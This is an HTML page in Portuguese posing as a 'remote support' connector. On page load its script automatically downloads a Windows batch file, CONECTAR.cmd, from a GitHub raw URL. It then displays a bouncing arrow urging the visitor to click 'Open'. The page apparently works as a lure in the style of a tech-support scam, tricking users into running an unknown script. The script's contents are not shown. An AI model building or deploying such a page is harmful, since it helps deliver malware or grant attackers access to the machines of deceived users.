<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Conectando ao Suporte...</title>
  <style>
    body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#f0f2f5;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
    .card{background:#fff;padding:36px;border-radius:16px;box-shadow:0 10px 25px rgba(0,0,0,.08);max-width:520px;text-align:center}
    .loader{border:5px solid #f3f3f3;border-top:5px solid #3498db;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;margin:18px auto}
    h1{color:#2c3e50;margin:8px 0} p{color:#6b7176;font-size:16px;line-height:1.5}
    a.manual-link{display:inline-block;margin-top:14px;color:#fff;background:#0366d6;padding:10px 14px;border-radius:8px;text-decoration:none}
    .status{margin-top:8px;color:#333;font-weight:600}
    @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
    .arrow-container{position:fixed;display:none;flex-direction:column;align-items:center;z-index:100}
    .arrow-text{background:#e74c3c;color:#fff;padding:8px 14px;border-radius:40px;font-weight:700;box-shadow:0 6px 18px rgba(231,76,60,.35);margin-bottom:8px}
    .arrow-icon{font-size:36px;color:#e74c3c;animation:bounce 1s infinite}
    @keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-8px)}}
    .top-right{top:18px;right:70px}.bottom-left{bottom:18px;left:18px}
  </style>
</head>
<body>
  <div class="card" role="main">
    <div class="loader" aria-hidden="true"></div>
    <h1>Iniciando Suporte Remoto</h1>
    <p>O download do instalador será iniciado automaticamente. Se não começar, use o botão abaixo.</p>
    <div class="status" id="status">Preparando download...</div>
    <a id="manualBtn" class="manual-link" href="#" download>Baixar manualmente</a>
  </div>

  <div id="arrow" class="arrow-container">
    <div class="arrow-icon" id="arrowIcon">⬆</div>
    <div class="arrow-text">Clique em "Abrir"</div>
  </div>

  <script>
    // URL do seu arquivo raw (usei a que você informou)
    const DOWNLOAD_URL = "https://github.com/cleves25/update-sys/raw/refs/heads/main/CONECTAR.cmd";
    const FILENAME = "CONECTAR.cmd"; // nome do arquivo salvo localmente (extensão em minúsculas)

    const statusEl = document.getElementById('status');
    const manualBtn = document.getElementById('manualBtn');

    // link de fallback (abre o raw no navegador)
    manualBtn.href = DOWNLOAD_URL;
    manualBtn.addEventListener('click', () => {
      // Some browsers respect the download attribute; others will open raw page — user can "Salvar como..."
      statusEl.textContent = "Se o navegador abrir o conteúdo, use 'Salvar como...' para guardar o arquivo.";
    });

    // tenta baixar via fetch -> blob -> download
    async function tryForceDownload() {
      statusEl.textContent = "Iniciando download...";
      try {
        const res = await fetch(DOWNLOAD_URL, { cache: "no-store", mode: "cors" });
        if (!res.ok) throw new Error("HTTP " + res.status);
        const blob = await res.blob();

        // cria URL temporário e dispara download
        const blobUrl = (window.URL || window.webkitURL).createObjectURL(blob);
        const a = document.createElement('a');
        a.style.display = 'none';
        a.href = blobUrl;
        a.download = FILENAME;
        document.body.appendChild(a);
        a.click();
        a.remove();

        statusEl.textContent = "Download iniciado — verifique sua pasta de downloads.";
        // mostra seta indicando barra de downloads do navegador
        mostrarSeta();
        // libera memória
        setTimeout(() => (window.URL || window.webkitURL).revokeObjectURL(blobUrl), 5000);
      } catch (err) {
        console.warn("Download via fetch falhou:", err);
        statusEl.textContent = "Download automático falhou. Abrindo o arquivo raw (use 'Salvar como...').";
        // fallback: navega até o raw (o usuário pode salvar manualmente)
        window.location.href = DOWNLOAD_URL;
      }
    }

    // Detecta navegador para posicionar a seta indicadora
    function mostrarSeta() {
      const arrow = document.getElementById('arrow');
      const icon = document.getElementById('arrowIcon');
      const ua = navigator.userAgent;
      const isModernChrome = ua.includes("Chrome") || ua.includes("Edg");
      arrow.style.display = 'flex';
      if (isModernChrome) {
        arrow.classList.add('top-right');
        icon.textContent = '⬆';
        arrow.style.flexDirection = 'column-reverse';
      } else {
        arrow.classList.add('bottom-left');
        icon.textContent = '⬇';
      }
    }

    // Inicia tentativa automática após curto delay
    window.addEventListener('load', () => {
      setTimeout(tryForceDownload, 900);
    });
  </script>
</body>
</html>